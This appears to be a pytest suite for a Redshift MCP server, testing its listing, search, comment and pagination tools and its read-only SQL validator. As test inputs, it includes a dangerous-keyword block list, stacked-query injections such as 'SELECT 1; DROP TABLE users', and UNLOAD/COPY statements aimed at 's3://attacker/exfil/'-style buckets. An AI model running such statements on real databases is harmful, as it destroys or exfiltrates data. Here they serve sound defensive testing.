import pytest
import pandas as pd
from unittest.mock import MagicMock, patch, Mock
from contextlib import contextmanager
from redshift_comment_mcp.redshift_tools import (
    RedshiftTools,
    paginate_results,
    apply_comment_cap,
    build_scale_hint,
    DEFAULT_MAX_ITEMS,
    MAX_COMMENT_LEN,
    SCALE_HINT_THRESHOLD,
    validate_read_only_sql,
)
from redshift_comment_mcp.connection import RedshiftConnectionConfig

def _get_tool_fn(tools, name):
    """Pull a registered tool's callable, surviving FastMCP API churn.

    FastMCP renamed / re-scoped the tool listing API across 2.x → 3.x:
    - 2.x exposes only the private coroutine ``_list_tools``
    - 3.x exposes a public coroutine ``list_tools``
    Try the public name first, fall back to the private one. ``tool.fn`` is
    stable across both lines.
    """
    import asyncio
    lister = getattr(tools.mcp, 'list_tools', None) or tools.mcp._list_tools
    for t in asyncio.run(lister()):
        if t.name == name:
            return t.fn
    raise KeyError(f"tool {name!r} not registered")


@pytest.fixture
def mock_config():
    """建立模擬的連線配置"""
    config = Mock(spec=RedshiftConnectionConfig)
    mock_conn = MagicMock()
    
    @contextmanager
    def mock_get_connection():
        try:
            yield mock_conn
        finally:
            pass
    
    config.get_connection = mock_get_connection
    return config, mock_conn

def test_connection_management(mock_config):
    """
    測試每次使用時建立/切斷連線的功能。
    """
    config, mock_conn = mock_config
    
    # 建立工具實例
    redshift_tools = RedshiftTools(config)
    
    # 驗證 FastMCP 實例被建立
    assert redshift_tools.mcp is not None
    assert hasattr(redshift_tools, 'config')

@patch('awswrangler.redshift.read_sql_query')
def test_list_schemas_with_connection(mock_read_sql, mock_config):
    """
    測試 list_schemas 工具的連線管理。
    """
    config, mock_conn = mock_config
    
    # 設定模擬資料
    mock_df = MagicMock()
    mock_df.fillna.return_value = mock_df
    mock_df.to_dict.return_value = [{'schema_name': 'public', 'schema_comment': ''}]
    mock_read_sql.return_value = mock_df
    
    # 建立工具實例 - 這會觸發工具註冊
    redshift_tools = RedshiftTools(config)
    
    # 驗證伺服器建立成功
    mcp_server = redshift_tools.get_server()
    assert mcp_server is not None
    assert mcp_server.name == "Redshift Comment MCP"
    
    # 驗證 awswrangler 被呼叫 (透過 connection context manager)
    # 由於工具已註冊但尚未執行，這裡主要驗證初始化無誤
    assert mock_read_sql.call_count == 0  # 尚未執行查詢

def test_schema_name_validation():
    """
    測試 schema 名稱驗證邏輯。
    """
    # 測試有效的 schema 名稱
    valid_names = ['public', 'schema1', 'my_schema']
    for name in valid_names:
        assert name and name.isidentifier(), f"{name} should be valid"
    
    # 測試無效的 schema 名稱
    invalid_names = ['', 'schema-with-dash', '123schema', 'schema with space']
    for name in invalid_names:
        assert not (name and name.isidentifier()), f"{name} should be invalid"

def test_sql_security_validation():
    """
    測試 SQL 安全性驗證邏輯。
    """
    # 測試有效的查詢
    valid_queries = [
        "SELECT * FROM users",
        "  SELECT count(*) FROM orders  ",  # 測試空白字元
        "WITH cte AS (SELECT * FROM users) SELECT * FROM cte"
    ]
    
    for query in valid_queries:
        sql_upper = query.strip().upper()
        assert sql_upper.startswith('SELECT') or sql_upper.startswith('WITH'), f"{query} should be valid"
    
    # 測試危險的 SQL 關鍵字
    dangerous_keywords = [
        'DROP', 'DELETE', 'UPDATE', 'INSERT', 'ALTER', 'CREATE', 'TRUNCATE',
        'MERGE', 'GRANT', 'REVOKE', 'COPY', 'UNLOAD',
    ]
    dangerous_queries = [
        "DROP TABLE users",
        "DELETE FROM users",
        "UPDATE users SET password = 'hack'",
        "INSERT INTO users VALUES ('hacker', 'password')",
        "ALTER TABLE users ADD COLUMN malicious TEXT",
        "CREATE TABLE evil_table (id INT)",
        "TRUNCATE TABLE users",
        "MERGE INTO users USING staging ON users.id = staging.id WHEN MATCHED THEN UPDATE SET name = staging.name",
        "GRANT ALL ON users TO public",
        "REVOKE SELECT ON users FROM analyst",
        "COPY users FROM 's3://attacker/users.csv' IAM_ROLE 'arn:...'",
        "UNLOAD ('SELECT * FROM users') TO 's3://attacker/exfil/' IAM_ROLE 'arn:...'",
    ]
    
    for query in dangerous_queries:
        sql_upper = query.strip().upper()
        has_dangerous_keyword = any(keyword in sql_upper for keyword in dangerous_keywords)
        assert has_dangerous_keyword, f"{query} should contain dangerous keyword"
    
    # 測試非 SELECT/WITH 開頭的語句
    invalid_queries = ["SHOW TABLES", "DESCRIBE users", "EXPLAIN SELECT * FROM users"]
    for query in invalid_queries:
        sql_upper = query.strip().upper()
        assert not (sql_upper.startswith('SELECT') or sql_upper.startswith('WITH')), f"{query} should be invalid"

def test_redshift_tools_initialization():
    """
    測試 RedshiftTools 的完整初始化流程。
    """
    # 建立模擬配置
    config = MagicMock()
    
    # 建立工具實例
    redshift_tools = RedshiftTools(config)
    
    # 驗證屬性設定
    assert redshift_tools.config == config
    assert redshift_tools.mcp is not None
    
    # 驗證伺服器建立
    server = redshift_tools.get_server()
    assert server is not None
    assert server.name == "Redshift Comment MCP"


# ========== paginate_results 函數測試 ==========

class TestPaginateResults:
    """測試 paginate_results 分頁函數"""

    def test_no_limit_within_default_max(self):
        """測試無 limit 且資料量在預設範圍內"""
        items = list(range(30))
        result = paginate_results(items, limit=None, offset=0, default_max=50)

        assert result["total_count"] == 30
        assert result["returned_count"] == 30
        assert result["has_more"] == False
        assert result["auto_truncated"] == False
        assert len(result["items"]) == 30

    def test_no_limit_exceeds_default_max(self):
        """測試無 limit 且資料量超過預設最大值時自動截斷"""
        items = list(range(100))
        result = paginate_results(items, limit=None, offset=0, default_max=50)

        assert result["total_count"] == 100
        assert result["returned_count"] == 50
        assert result["has_more"] == True
        assert result["auto_truncated"] == True
        assert len(result["items"]) == 50

    def test_with_explicit_limit(self):
        """測試有明確 limit 時的分頁"""
        items = list(range(100))
        result = paginate_results(items, limit=20, offset=0, default_max=50)

        assert result["total_count"] == 100
        assert result["returned_count"] == 20
        assert result["has_more"] == True
        assert result["auto_truncated"] == False
        assert result["limit"] == 20

    def test_with_offset(self):
        """測試 offset 參數"""
        items = list(range(100))
        result = paginate_results(items, limit=10, offset=50, default_max=50)

        assert result["total_count"] == 100
        assert result["offset"] == 50
        assert result["items"] == list(range(50, 60))

    def test_empty_list(self):
        """測試空列表"""
        items = []
        result = paginate_results(items, limit=None, offset=0, default_max=50)

        assert result["total_count"] == 0
        assert result["returned_count"] == 0
        assert result["has_more"] == False
        assert result["items"] == []

    def test_exact_boundary(self):
        """測試剛好等於預設最大值的情況"""
        items = list(range(50))
        result = paginate_results(items, limit=None, offset=0, default_max=50)

        assert result["total_count"] == 50
        assert result["returned_count"] == 50
        assert result["has_more"] == False
        assert result["auto_truncated"] == False


# ========== 列表工具執行測試 ==========

class TestListToolsExecution:
    """測試列表工具的實際執行"""

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_schemas_execution(self, mock_read_sql, mock_config):
        """測試 list_schemas 工具執行（不含註解）"""
        config, mock_conn = mock_config

        # 模擬回傳資料
        mock_df = pd.DataFrame({'schema_name': ['public', 'sales', 'analytics']})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        # 取得註冊的工具函數
        list_schemas = _get_tool_fn(tools, 'list_schemas')

        result = list_schemas(include_comments=False)

        assert result["total_count"] == 3
        assert result["schemas"] == ['public', 'sales', 'analytics']
        assert "warning" in result

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_schemas_with_include_comments(self, mock_read_sql, mock_config):
        """測試 list_schemas 工具啟用 include_comments"""
        config, mock_conn = mock_config

        # 模擬回傳資料（包含註解）
        mock_df = pd.DataFrame({
            'schema_name': ['public', 'sales'],
            'schema_comment': ['Default schema', 'Sales data schema']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        list_schemas = _get_tool_fn(tools, 'list_schemas')

        result = list_schemas(include_comments=True)

        assert result["total_count"] == 2
        # 使用 include_comments=True 時，回傳格式為 [{"name": "...", "comment": "..."}, ...]
        assert len(result["schemas"]) == 2
        assert result["schemas"][0] == {"name": "public", "comment": "Default schema"}
        assert result["schemas"][1] == {"name": "sales", "comment": "Sales data schema"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_schemas_with_include_comments_no_comment(self, mock_read_sql, mock_config):
        """測試 list_schemas 工具啟用 include_comments 但 schema 無註解"""
        config, mock_conn = mock_config

        # 模擬回傳資料（無註解）
        mock_df = pd.DataFrame({
            'schema_name': ['public'],
            'schema_comment': [None]
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        list_schemas = _get_tool_fn(tools, 'list_schemas')

        result = list_schemas(include_comments=True)

        assert result["total_count"] == 1
        assert result["schemas"][0] == {"name": "public", "comment": "(No comment available)"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_tables_execution(self, mock_read_sql, mock_config):
        """測試 list_tables 工具執行（不含註解）"""
        config, mock_conn = mock_config

        # 模擬 schema comment 查詢和 tables 查詢
        schema_df = pd.DataFrame({'schema_comment': ['Sales data schema']})
        tables_df = pd.DataFrame({
            'table_name': ['orders', 'customers'],
            'table_type': ['BASE TABLE', 'BASE TABLE']
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(config)
        list_tables = _get_tool_fn(tools, 'list_tables')

        result = list_tables(schema_name='sales', include_comments=False)

        assert result["schema_name"] == 'sales'
        assert result["schema_comment"] == 'Sales data schema'
        assert result["total_count"] == 2
        assert len(result["tables"]) == 2

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_tables_with_include_comments(self, mock_read_sql, mock_config):
        """測試 list_tables 工具啟用 include_comments"""
        config, mock_conn = mock_config

        # 模擬 schema comment 查詢和 tables 查詢（包含 table 註解）
        schema_df = pd.DataFrame({'schema_comment': ['Sales data schema']})
        tables_df = pd.DataFrame({
            'table_name': ['orders', 'customers'],
            'table_type': ['BASE TABLE', 'BASE TABLE'],
            'table_comment': ['Order records', 'Customer master data']
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(config)
        list_tables = _get_tool_fn(tools, 'list_tables')

        result = list_tables(schema_name='sales', include_comments=True)

        assert result["schema_name"] == 'sales'
        assert result["total_count"] == 2
        # 使用 include_comments=True 時，回傳格式包含 comment 欄位
        assert result["tables"][0] == {"name": "orders", "type": "BASE TABLE", "comment": "Order records"}
        assert result["tables"][1] == {"name": "customers", "type": "BASE TABLE", "comment": "Customer master data"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_tables_with_include_comments_no_comment(self, mock_read_sql, mock_config):
        """測試 list_tables 工具啟用 include_comments 但 table 無註解"""
        config, mock_conn = mock_config

        schema_df = pd.DataFrame({'schema_comment': ['Sales data schema']})
        tables_df = pd.DataFrame({
            'table_name': ['orders'],
            'table_type': ['BASE TABLE'],
            'table_comment': [None]
        })
        mock_read_sql.side_effect = [schema_df, tables_df]

        tools = RedshiftTools(config)
        list_tables = _get_tool_fn(tools, 'list_tables')

        result = list_tables(schema_name='sales', include_comments=True)

        assert result["tables"][0] == {"name": "orders", "type": "BASE TABLE", "comment": "(No comment available)"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_tables_without_parent_comments(self, mock_read_sql, mock_config):
        """測試 list_tables 工具停用 include_parent_comments"""
        config, mock_conn = mock_config

        # 只模擬 tables 查詢（不查詢 schema comment）
        tables_df = pd.DataFrame({
            'table_name': ['orders', 'customers'],
            'table_type': ['BASE TABLE', 'BASE TABLE']
        })
        mock_read_sql.return_value = tables_df

        tools = RedshiftTools(config)
        list_tables = _get_tool_fn(tools, 'list_tables')

        result = list_tables(schema_name='sales', include_parent_comments=False)

        assert result["schema_name"] == 'sales'
        assert "schema_comment" not in result  # 不應包含 schema_comment
        assert result["total_count"] == 2
        # 只有一次 SQL 查詢（不包含 schema comment 查詢）
        assert mock_read_sql.call_count == 1

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_columns_execution(self, mock_read_sql, mock_config):
        """測試 list_columns 工具執行（不含註解）"""
        config, mock_conn = mock_config

        # 模擬 table comment 查詢和 columns 查詢
        table_df = pd.DataFrame({'table_comment': ['Order records']})
        columns_df = pd.DataFrame({
            'column_name': ['id', 'customer_id', 'amount'],
            'data_type': ['integer', 'integer', 'numeric'],
            'is_nullable': ['NO', 'NO', 'YES']
        })
        mock_read_sql.side_effect = [table_df, columns_df]

        tools = RedshiftTools(config)
        list_columns = _get_tool_fn(tools, 'list_columns')

        result = list_columns(schema_name='sales', table_name='orders', include_comments=False)

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["table_comment"] == 'Order records'
        assert result["total_count"] == 3

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_columns_with_include_comments(self, mock_read_sql, mock_config):
        """測試 list_columns 工具啟用 include_comments"""
        config, mock_conn = mock_config

        # 模擬 table comment 查詢和 columns 查詢（包含 column 註解）
        table_df = pd.DataFrame({'table_comment': ['Order records']})
        columns_df = pd.DataFrame({
            'column_name': ['id', 'amount'],
            'data_type': ['integer', 'numeric'],
            'is_nullable': ['NO', 'YES'],
            'column_comment': ['Primary key', 'Order total amount']
        })
        mock_read_sql.side_effect = [table_df, columns_df]

        tools = RedshiftTools(config)
        list_columns = _get_tool_fn(tools, 'list_columns')

        result = list_columns(schema_name='sales', table_name='orders', include_comments=True)

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["total_count"] == 2
        # 使用 include_comments=True 時，回傳格式包含 comment 欄位
        assert result["columns"][0] == {"name": "id", "type": "integer", "nullable": "NO", "comment": "Primary key"}
        assert result["columns"][1] == {"name": "amount", "type": "numeric", "nullable": "YES", "comment": "Order total amount"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_columns_with_include_comments_no_comment(self, mock_read_sql, mock_config):
        """測試 list_columns 工具啟用 include_comments 但 column 無註解"""
        config, mock_conn = mock_config

        table_df = pd.DataFrame({'table_comment': ['Order records']})
        columns_df = pd.DataFrame({
            'column_name': ['id'],
            'data_type': ['integer'],
            'is_nullable': ['NO'],
            'column_comment': [None]
        })
        mock_read_sql.side_effect = [table_df, columns_df]

        tools = RedshiftTools(config)
        list_columns = _get_tool_fn(tools, 'list_columns')

        result = list_columns(schema_name='sales', table_name='orders', include_comments=True)

        assert result["columns"][0] == {"name": "id", "type": "integer", "nullable": "NO", "comment": "(No comment available)"}

    @patch('awswrangler.redshift.read_sql_query')
    def test_list_columns_without_parent_comments(self, mock_read_sql, mock_config):
        """測試 list_columns 工具停用 include_parent_comments"""
        config, mock_conn = mock_config

        # 只模擬 columns 查詢（不查詢 table comment）
        columns_df = pd.DataFrame({
            'column_name': ['id', 'amount'],
            'data_type': ['integer', 'numeric'],
            'is_nullable': ['NO', 'YES']
        })
        mock_read_sql.return_value = columns_df

        tools = RedshiftTools(config)
        list_columns = _get_tool_fn(tools, 'list_columns')

        result = list_columns(schema_name='sales', table_name='orders', include_parent_comments=False)

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert "table_comment" not in result  # 不應包含 table_comment
        assert result["total_count"] == 2
        # 只有一次 SQL 查詢（不包含 table comment 查詢）
        assert mock_read_sql.call_count == 1


# ========== 搜尋工具測試 ==========

class TestSearchTools:
    """測試搜尋工具"""

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_schemas_execution(self, mock_read_sql, mock_config):
        """測試 search_schemas 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['sales', 'sales_archive'],
            'schema_comment': ['Sales data schema', 'Archived sales data']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        search_schemas = _get_tool_fn(tools, 'search_schemas')

        result = search_schemas(keywords='sales 銷售')

        assert result["keywords"] == ['sales', '銷售']
        assert result["total_count"] == 2
        assert len(result["schemas"]) == 2
        # 第一個結果應有最高 hit_count（或相同 hit_count 時按名稱排序）
        assert "hit_count" in result["schemas"][0]
        assert result["schemas"][0]["name"] == "sales"
        assert result["schemas"][0]["comment"] == "Sales data schema"

    def test_search_schemas_empty_keywords(self, mock_config):
        """測試 search_schemas 空關鍵字驗證"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        search_schemas = _get_tool_fn(tools, 'search_schemas')

        with pytest.raises(ValueError, match="At least one keyword is required"):
            search_schemas(keywords='   ')

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_schemas_no_comment(self, mock_read_sql, mock_config):
        """測試 search_schemas 無註解時回傳預設訊息"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['public'],
            'schema_comment': ['']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        search_schemas = _get_tool_fn(tools, 'search_schemas')

        result = search_schemas(keywords='public')

        assert result["schemas"][0]["name"] == "public"
        assert result["schemas"][0]["comment"] == "(No comment available)"
        assert "hit_count" in result["schemas"][0]

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_schemas_hit_count_sorting(self, mock_read_sql, mock_config):
        """測試 search_schemas 結果依 hit_count 降序排列"""
        config, mock_conn = mock_config

        # 設定測試資料：sales_data 應該命中 2 個關鍵字，其他只命中 1 個
        mock_df = pd.DataFrame({
            'schema_name': ['analytics', 'sales_data', 'archive'],
            'schema_comment': ['Analytics reports', 'Sales and data warehouse', 'Old data']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        search_schemas = _get_tool_fn(tools, 'search_schemas')

        # 搜尋 "sales data" - sales_data 應該命中兩個關鍵字
        result = search_schemas(keywords='sales data')

        # 驗證 hit_count 排序
        assert result["schemas"][0]["name"] == "sales_data"
        assert result["schemas"][0]["hit_count"] == 2  # 命中 'sales' 和 'data'
        # 其他結果 hit_count 應該較低
        for schema in result["schemas"][1:]:
            assert schema["hit_count"] <= result["schemas"][0]["hit_count"]

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_tables_hit_count_sorting(self, mock_read_sql, mock_config):
        """測試 search_tables 結果依 hit_count 降序排列"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['sales', 'sales', 'sales'],
            'table_name': ['order_items', 'orders', 'customers'],
            'table_type': ['BASE TABLE', 'BASE TABLE', 'BASE TABLE'],
            'table_comment': ['Order line items with order details', 'Order records', 'Customer info']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        search_tables = _get_tool_fn(tools, 'search_tables')

        # 搜尋 "order items" - order_items 應該命中兩個關鍵字
        result = search_tables(keywords='order items', schema_name='sales')

        # 驗證 hit_count 排序
        assert result["tables"][0]["table_name"] == "order_items"
        assert result["tables"][0]["hit_count"] == 2  # 命中 'order' 和 'items'
        assert "hit_count" in result["tables"][1]

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_columns_hit_count_sorting(self, mock_read_sql, mock_config):
        """測試 search_columns 結果依 hit_count 降序排列"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'column_name': ['total_amount', 'order_id', 'amount'],
            'data_type': ['numeric', 'integer', 'numeric'],
            'is_nullable': ['YES', 'NO', 'YES'],
            'column_comment': ['Total order amount', 'Order identifier', 'Transaction amount']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        search_columns = _get_tool_fn(tools, 'search_columns')

        # 搜尋 "total amount" - total_amount 應該命中兩個關鍵字
        result = search_columns(keywords='total amount', schema_name='sales', table_name='orders')

        # 驗證 hit_count 排序
        assert result["columns"][0]["column_name"] == "total_amount"
        assert result["columns"][0]["hit_count"] == 2  # 命中 'total' 和 'amount'
        assert "hit_count" in result["columns"][1]

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_tables_execution(self, mock_read_sql, mock_config):
        """測試 search_tables 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'schema_name': ['sales', 'sales'],
            'table_name': ['orders', 'order_items'],
            'table_type': ['BASE TABLE', 'BASE TABLE'],
            'table_comment': ['Order records', 'Order line items']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        search_tables = _get_tool_fn(tools, 'search_tables')

        result = search_tables(keywords='order 訂單', schema_name='sales')

        assert result["keywords"] == ['order', '訂單']
        assert result["schema_filter"] == 'sales'  # 注意：回傳欄位名稱是 schema_filter
        assert result["total_count"] == 2

    def test_search_tables_empty_keywords(self, mock_config):
        """測試 search_tables 空關鍵字驗證"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        search_tables = _get_tool_fn(tools, 'search_tables')

        with pytest.raises(ValueError, match="At least one keyword is required"):
            search_tables(keywords='   ', schema_name='sales')

    def test_search_tables_invalid_schema(self, mock_config):
        """測試 search_tables 無效 schema 名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        search_tables = _get_tool_fn(tools, 'search_tables')

        with pytest.raises(ValueError, match="Invalid schema name"):
            search_tables(keywords='order', schema_name='invalid-schema')

    @patch('awswrangler.redshift.read_sql_query')
    def test_search_columns_execution(self, mock_read_sql, mock_config):
        """測試 search_columns 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'column_name': ['customer_id', 'customer_name'],
            'data_type': ['integer', 'varchar'],
            'is_nullable': ['NO', 'YES'],
            'column_comment': ['Customer ID', 'Customer full name']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        search_columns = _get_tool_fn(tools, 'search_columns')

        result = search_columns(keywords='customer', schema_name='sales', table_name='orders')

        assert result["keywords"] == ['customer']
        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["total_count"] == 2

    def test_search_columns_invalid_table(self, mock_config):
        """測試 search_columns 無效 table 名稱"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        search_columns = _get_tool_fn(tools, 'search_columns')

        with pytest.raises(ValueError, match="Invalid table name"):
            search_columns(keywords='id', schema_name='sales', table_name='invalid-table')


# ========== 註解查詢工具測試 ==========

class TestCommentQueryTools:
    """測試註解查詢工具"""

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_schema_comment_execution(self, mock_read_sql, mock_config):
        """測試 get_schema_comment 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({'schema_comment': ['This is the sales schema']})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        get_schema_comment = _get_tool_fn(tools, 'get_schema_comment')

        result = get_schema_comment(schema_name='sales')

        assert result["schema_name"] == 'sales'
        assert result["comment"] == 'This is the sales schema'

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_schema_comment_not_found(self, mock_read_sql, mock_config):
        """測試 get_schema_comment schema 不存在"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame(columns=['schema_comment'])  # 空的 DataFrame
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        get_schema_comment = _get_tool_fn(tools, 'get_schema_comment')

        with pytest.raises(ValueError, match="not found"):
            get_schema_comment(schema_name='nonexistent')

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_table_comment_execution(self, mock_read_sql, mock_config):
        """測試 get_table_comment 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({'table_comment': ['Contains order records']})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        get_table_comment = _get_tool_fn(tools, 'get_table_comment')

        result = get_table_comment(schema_name='sales', table_name='orders')

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["comment"] == 'Contains order records'

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_column_comment_execution(self, mock_read_sql, mock_config):
        """測試 get_column_comment 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'data_type': ['integer'],
            'column_comment': ['Primary key for orders']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        get_column_comment = _get_tool_fn(tools, 'get_column_comment')

        result = get_column_comment(schema_name='sales', table_name='orders', column_name='id')

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["column_name"] == 'id'
        assert result["data_type"] == 'integer'
        assert result["comment"] == 'Primary key for orders'

    @patch('awswrangler.redshift.read_sql_query')
    def test_get_all_column_comments_execution(self, mock_read_sql, mock_config):
        """測試 get_all_column_comments 工具執行"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'column_name': ['id', 'amount'],
            'data_type': ['integer', 'numeric'],
            'is_nullable': ['NO', 'YES'],
            'column_comment': ['Order ID', None]
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        get_all_column_comments = _get_tool_fn(tools, 'get_all_column_comments')

        result = get_all_column_comments(schema_name='sales', table_name='orders')

        assert result["schema_name"] == 'sales'
        assert result["table_name"] == 'orders'
        assert result["total_count"] == 2


# ========== SQL 執行測試 ==========

class TestExecuteSQL:
    """測試 SQL 執行工具"""

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_select(self, mock_read_sql, mock_config):
        """測試有效的 SELECT 查詢"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({
            'id': [1, 2, 3],
            'name': ['Alice', 'Bob', 'Charlie']
        })
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')

        result = execute_sql(sql_statement='SELECT * FROM users')

        assert result["total_count"] == 3
        assert result["columns"] == ['id', 'name']
        assert len(result["data"]) == 3

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_with_cte(self, mock_read_sql, mock_config):
        """測試有效的 WITH (CTE) 查詢"""
        config, mock_conn = mock_config

        mock_df = pd.DataFrame({'count': [10]})
        mock_read_sql.return_value = mock_df

        tools = RedshiftTools(config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')

        result = execute_sql(sql_statement='WITH cte AS (SELECT * FROM users) SELECT count(*) FROM cte')

        assert result["total_count"] == 1

    def test_execute_sql_dangerous_drop(self, mock_config):
        """測試拒絕 DROP 語句"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        execute_sql = _get_tool_fn(tools, 'execute_sql')

        with pytest.raises(ValueError, match="DROP"):
            execute_sql(sql_statement='SELECT * FROM users; DROP TABLE users')

    def test_execute_sql_dangerous_delete(self, mock_config):
        """測試拒絕包含 DELETE 的查詢"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        execute_sql = _get_tool_fn(tools, 'execute_sql')

        # 使用 SELECT 開頭但包含 DELETE 的語句
        with pytest.raises(ValueError, match="DELETE"):
            execute_sql(sql_statement='SELECT * FROM users; DELETE FROM users WHERE id = 1')

    def test_execute_sql_invalid_start(self, mock_config):
        """測試拒絕非 SELECT/WITH 開頭的查詢"""
        config, mock_conn = mock_config
        tools = RedshiftTools(config)

        execute_sql = _get_tool_fn(tools, 'execute_sql')

        with pytest.raises(ValueError, match="Only SELECT and WITH"):
            execute_sql(sql_statement='SHOW TABLES')

    @pytest.mark.parametrize("keyword,sql", [
        # MERGE SQL kept minimal so it doesn't contain UPDATE/DELETE/INSERT (which would
        # match earlier in the dangerous_keywords list and mask the MERGE check).
        ("MERGE",  "WITH src AS (SELECT 1 id) SELECT 1; MERGE INTO t USING src ON 1=1"),
        ("GRANT",  "SELECT 1; GRANT ALL ON users TO public"),
        ("REVOKE", "SELECT 1; REVOKE SELECT ON users FROM analyst"),
        ("COPY",   "SELECT 1; COPY users FROM 's3://bad/' IAM_ROLE 'arn:...'"),
        ("UNLOAD", "SELECT 1; UNLOAD ('SELECT * FROM users') TO 's3://exfil/' IAM_ROLE 'arn:...'"),
    ])
    def test_execute_sql_dangerous_extra_keywords(self, mock_config, keyword, sql):
        """擋掉 v0.3.x 後新增的關鍵字（MERGE / GRANT / REVOKE / COPY / UNLOAD），
        含 CTE 偽裝（SELECT 開頭但 DML/admin 動作藏在後段）。"""
        config, _ = mock_config
        tools = RedshiftTools(config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')
        with pytest.raises(ValueError, match=keyword):
            execute_sql(sql_statement=sql)

    @patch('awswrangler.redshift.read_sql_query')
    def test_execute_sql_with_bom_prefix_passes(self, mock_read_sql, mock_config):
        """BOM 等不可見字元在 SQL 前不應誤觸 startswith 檢查。"""
        config, _ = mock_config
        mock_read_sql.return_value = pd.DataFrame({'x': [1]})
        tools = RedshiftTools(config)
        execute_sql = _get_tool_fn(tools, 'execute_sql')
        # 各種會出現在傳輸層或編輯器複製的不可見前綴
        for prefix in ('﻿', '​', ' ', '⁠'):
            result = execute_sql(sql_statement=prefix + 'WITH cte AS (SELECT 1 x) SELECT * FROM cte')
            assert result["total_count"] == 1


class TestValidateReadOnlySQL:
    """直接測試 validate_read_only_sql 純函式（不繞 MCP/連線）。"""

    @pytest.mark.parametrize("sql", [
        "SELECT 1",
        "  select 1  ",
        "WITH cte AS (SELECT 1 x) SELECT * FROM cte",
        "with cte as (select 1) select * from cte",
        "﻿SELECT 1",
        "​ WITH cte AS (SELECT 1 x) SELECT * FROM cte",
        # 字串/註解內含禁字 — 不應誤殺
        "SELECT * FROM users WHERE name = 'DELETE me'",
        "SELECT col1 -- DROP TABLE old, kept for archaeology\nFROM t",
        "SELECT col1 /* could DROP this column later */ FROM t",
        "SELECT 'INSERT INTO logs VALUES (1)' AS note FROM dual",
        # quoted identifier 用禁字當欄名
        'SELECT "DELETE" FROM "DROP"',
        # 使用者實際失敗的那支結構
        "WITH dev AS (SELECT 1 a), prod AS (SELECT 1 a), j AS "
        "(SELECT dev.a FROM dev JOIN prod ON dev.a = prod.a) "
        "SELECT * FROM j ORDER BY a",
    ])
    def test_valid_queries_pass(self, sql):
        validate_read_only_sql(sql)  # should not raise

    @pytest.mark.parametrize("sql,expected_msg", [
        ("", "Empty"),
        ("   \n\t  ", "Empty"),
        ("﻿​   ", "Empty"),
        ("SHOW TABLES", "Only SELECT and WITH"),
        ("EXPLAIN SELECT * FROM t", "Only SELECT and WITH"),
